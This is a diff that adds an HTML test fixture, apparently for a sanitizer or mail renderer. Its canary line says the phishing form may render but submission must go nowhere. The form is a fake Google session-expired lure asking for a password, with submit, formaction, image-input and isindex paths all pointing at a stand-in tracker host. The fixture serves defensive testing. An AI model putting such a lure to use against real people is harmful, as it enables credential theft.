@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>form</title>
+</head>
+<body>
+<p class="canary">08 form: the text of this phishing form may render; submitting must go nowhere.</p>
+<form id="f" action="http://tracker.invalid/08-post" method="post">
+<p>Your session expired. Re-enter your Google password to keep reading.</p>
+<input name="email" value="robin@hale.example">
+<input name="password" type="password" placeholder="Password">
+<button type="submit">Sign in</button>
+</form>
+<button form="f" formaction="http://tracker.invalid/08-formaction">Detached submit</button>
+<input type="image" src="http://tracker.invalid/08-input-image.png" alt="image submit">
+<isindex action="http://tracker.invalid/08-isindex">
+</body>
+</html>
